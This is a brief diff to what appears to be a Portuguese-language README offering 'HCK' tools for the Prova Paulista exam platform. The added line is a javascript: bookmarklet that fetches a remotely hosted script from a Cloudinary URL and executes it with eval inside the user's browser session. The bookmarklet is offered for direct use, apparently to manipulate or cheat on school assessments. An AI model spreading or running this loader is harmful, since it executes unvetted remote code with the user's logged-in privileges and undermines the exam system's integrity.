@@ -1,6 +1,6 @@
 ## HCK - PROVA PAULISTA V2:
 ```js
-DISPONÍVEL EM 09/06
+javascript:fetch("https://res.cloudinary.com/dctxcezsd/raw/upload/v1749456899/provapaulistav2.js").then(t=>t.text()).then(eval);
 ```
 
 ## HCK - TAREFAS V2:
